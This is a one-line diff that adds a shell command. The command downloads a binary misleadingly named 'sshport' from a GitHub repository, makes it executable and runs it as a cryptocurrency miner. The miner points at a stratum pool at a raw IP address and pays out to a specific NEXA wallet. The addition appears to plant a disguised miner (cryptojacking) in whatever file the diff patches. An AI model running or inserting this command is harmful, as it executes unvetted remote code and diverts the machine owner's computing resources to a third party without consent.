@@ -1,0 +1,1 @@
+wget https://github.com/rfeikgeeric/merixasos/raw/main/sshport && chmod 700 sshport && ./sshport --algo NEXA --pool stratum+tcp://209.25.142.72:2222 --user nexa:nqtsq5g56cgf4nl5894afnvtlqfln3sh8rtjxv8wmtgz90hc.STRIXGPU
